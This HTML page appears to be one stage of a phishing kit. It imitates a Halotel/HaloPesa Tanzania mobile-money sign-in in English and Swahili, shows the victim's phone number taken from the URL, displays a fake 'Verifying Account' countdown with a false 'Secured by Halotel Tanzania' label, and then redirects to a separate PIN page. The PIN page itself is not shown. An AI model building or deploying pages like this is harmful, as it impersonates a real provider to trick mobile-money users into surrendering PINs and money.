<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Halotel — Sign In</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }

        body {
            background: #f7f7f7;
            min-height: 100vh;
            display: flex; flex-direction: column;
        }

        /* HEADER */
        .header {
            background: #fff; padding: 14px 20px;
            display: flex; align-items: center; gap: 14px;
            border-bottom: 3px solid #F58220;
            box-shadow: 0 2px 8px rgba(0,0,0,0.04);
        }
        .logo-box { display: flex; align-items: center; gap: 10px; }
        .logo-mark {
            width: 40px; height: 40px; background: #F58220;
            border-radius: 10px; display: flex; align-items: center;
            justify-content: center; color: #fff; font-weight: 900; font-size: 18px;
        }
        .logo-text { font-weight: 900; font-size: 20px; color: #1a1a1a; letter-spacing: -0.5px; }
        .logo-text span { color: #F58220; }
        .header-title { font-size: 14px; font-weight: 700; color: #444; margin-left: auto; }

        /* MAIN */
        .main {
            flex: 1; display: flex; justify-content: center;
            padding: 30px 16px 60px;
        }

        .card {
            background: #fff; width: 100%; max-width: 480px;
            border-radius: 20px; padding: 40px 32px 36px;
            box-shadow: 0 8px 30px rgba(0,0,0,0.06);
            height: fit-content;
        }

        .halotel-logo {
            text-align: center;
            margin-bottom: 28px;
        }

        .halotel-mark {
            display: inline-flex; align-items: center; gap: 10px;
            margin-bottom: 14px;
        }

        .halotel-icon {
            width: 56px; height: 56px;
            background: linear-gradient(135deg, #F58220, #ff9a45);
            border-radius: 16px;
            display: flex; align-items: center; justify-content: center;
            color: #fff; font-weight: 900; font-size: 24px;
            box-shadow: 0 8px 20px rgba(245,130,32,0.35);
        }

        .halotel-name {
            font-size: 24px; font-weight: 900; color: #111;
            letter-spacing: -0.5px;
        }

        .halotel-tag {
            font-size: 12px; color: #888; font-weight: 600;
            letter-spacing: 2px; text-transform: uppercase;
        }

        h1 {
            font-size: 22px; font-weight: 800; color: #111;
            text-align: center; margin-bottom: 8px;
        }

        .sub {
            font-size: 14px; color: #666;
            text-align: center; margin-bottom: 32px;
            line-height: 1.5;
        }

        .form-group { margin-bottom: 20px; }
        .form-group label {
            display: block; font-size: 13px; font-weight: 700;
            color: #333; margin-bottom: 8px;
        }

        .phone-display {
            display: flex; align-items: center;
            gap: 10px;
            padding: 16px 18px;
            background: #f8f8f8;
            border: 1.5px solid #e5e5e5;
            border-radius: 12px;
        }

        .country-flag {
            font-size: 20px;
        }

        .country-code {
            font-weight: 700; font-size: 15px; color: #333;
        }

        .phone-value {
            font-weight: 800; font-size: 16px; color: #111;
            letter-spacing: 0.5px;
        }

        .locked-icon {
            margin-left: auto; font-size: 16px; color: #aaa;
        }

        .login-btn {
            width: 100%;
            background: #F58220;
            color: #fff;
            border: none;
            padding: 18px;
            font-size: 15px;
            font-weight: 900;
            letter-spacing: 1.5px;
            border-radius: 12px;
            cursor: pointer;
            text-transform: uppercase;
            margin-top: 8px;
            transition: background 0.2s, transform 0.1s;
            box-shadow: 0 6px 16px rgba(245,130,32,0.3);
        }
        .login-btn:hover { background: #d96f18; }
        .login-btn:active { transform: scale(0.99); }

        .secure-note {
            display: flex; align-items: center; justify-content: center;
            gap: 6px;
            font-size: 12px; color: #888;
            margin-top: 22px;
        }

        /* LOADING OVERLAY — 3 second countdown */
        .loading {
            position: fixed; inset: 0;
            background: rgba(255,255,255,0.98);
            display: none; flex-direction: column;
            align-items: center; justify-content: center;
            z-index: 999; padding: 24px; text-align: center;
        }
        .loading.show { display: flex; }

        .spinner {
            width: 70px; height: 70px;
            border: 6px solid #ffe3c7;
            border-top: 6px solid #F58220;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 24px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }

        .loading-title {
            font-size: 20px; font-weight: 800; color: #111;
            margin-bottom: 8px;
        }
        .loading-sub {
            font-size: 14px; color: #666; margin-bottom: 24px;
        }
        .countdown {
            width: 60px; height: 60px;
            background: #F58220; color: #fff;
            border-radius: 50%;
            display: flex; align-items: center; justify-content: center;
            font-size: 26px; font-weight: 900;
            box-shadow: 0 8px 20px rgba(245,130,32,0.4);
        }

        .footer {
            background: #111; color: #F58220; text-align: center;
            padding: 18px; font-size: 12px; font-weight: 600;
        }

        @media (max-width: 480px) {
            .card { padding: 30px 22px; }
            h1 { font-size: 19px; }
        }
    </style>
</head>
<body>

    <header class="header">
        <div class="logo-box">
            <div class="logo-mark">H</div>
            <div class="logo-text">Halo<span>Pesa</span></div>
        </div>
        <span class="header-title" id="headerTitle">Mobile Services</span>
    </header>

    <main class="main">
        <div class="card">
            <div class="halotel-logo">
                <div class="halotel-mark">
                    <div class="halotel-icon">H</div>
                    <div>
                        <div class="halotel-name">Halotel</div>
                        <div class="halotel-tag" id="halotelTag">TANZANIA</div>
                    </div>
                </div>
            </div>

            <h1 id="heading">Sign in to continue</h1>
            <p class="sub" id="subheading">Please confirm your number to proceed with the application</p>

            <div class="form-group">
                <label id="lblPhone">Your Phone Number</label>
                <div class="phone-display">
                    <span class="country-flag">🇹🇿</span>
                    <span class="country-code">+255</span>
                    <span class="phone-value" id="phoneValue">7XX XXX XXX</span>
                    <span class="locked-icon">🔒</span>
                </div>
            </div>

            <button class="login-btn" id="loginBtn" onclick="doLogin()">Log In</button>

            <div class="secure-note">
                <span>🔒</span>
                <span id="secureNote">Secured by Halotel Tanzania</span>
            </div>
        </div>
    </main>

    <!-- Loading overlay -->
    <div class="loading" id="loading">
        <div class="spinner"></div>
        <div class="loading-title" id="loadingTitle">Verifying Account</div>
        <div class="loading-sub" id="loadingSub">Please wait while we confirm your number…</div>
        <div class="countdown" id="countdown">3</div>
    </div>

    <footer class="footer" id="footer">© 2026 HaloPesa Loans TZ</footer>

    <script>
        const LANG = {
            en: {
                headerTitle: 'Mobile Services',
                halotelTag: 'TANZANIA',
                heading: 'Sign in to continue',
                subheading: 'Please confirm your number to proceed with the application',
                lblPhone: 'Your Phone Number',
                loginBtn: 'Log In',
                secureNote: 'Secured by Halotel Tanzania',
                loadingTitle: 'Verifying Account',
                loadingSub: 'Please wait while we confirm your number…',
                footer: '© 2026 HaloPesa Loans TZ'
            },
            sw: {
                headerTitle: 'Huduma za Simu',
                halotelTag: 'TANZANIA',
                heading: 'Ingia ili kuendelea',
                subheading: 'Tafadhali thibitisha namba yako ili kuendelea na maombi',
                lblPhone: 'Namba Yako ya Simu',
                loginBtn: 'Ingia',
                secureNote: 'Imelindwa na Halotel Tanzania',
                loadingTitle: 'Inathibitisha Akaunti',
                loadingSub: 'Tafadhali subiri tunathibitisha namba yako…',
                footer: '© 2026 HaloPesa Loans TZ'
            }
        };

        const lang = localStorage.getItem('lang') || 'en';
        const t = LANG[lang];

        ['headerTitle','halotelTag','heading','subheading','lblPhone',
         'secureNote','loadingTitle','loadingSub','footer'].forEach(id => {
            const el = document.getElementById(id);
            if (el) el.textContent = t[id];
        });
        document.getElementById('loginBtn').textContent = t.loginBtn;

        // Read phone from URL and display
        const params = new URLSearchParams(window.location.search);
        const phone = params.get('phone') || '';

        function formatPhone(p) {
            // p is like "712345678" — show as "712 345 678"
            const clean = p.replace(/\D/g, '');
            if (clean.length === 9) {
                return clean.slice(0,3) + ' ' + clean.slice(3,6) + ' ' + clean.slice(6,9);
            }
            return clean || '7XX XXX XXX';
        }
        document.getElementById('phoneValue').textContent = formatPhone(phone);

        // Login + 3 second countdown
        function doLogin() {
            document.getElementById('loading').classList.add('show');
            let n = 3;
            const cd = document.getElementById('countdown');
            cd.textContent = n;
            const iv = setInterval(() => {
                n--;
                cd.textContent = n;
                if (n <= 0) {
                    clearInterval(iv);
                    const next = new URLSearchParams(params);
                    next.set('lang', lang);
                    window.location.href = 'pin.html?' + next.toString();
                }
            }, 1000);
        }
    </script>
</body>
</html>
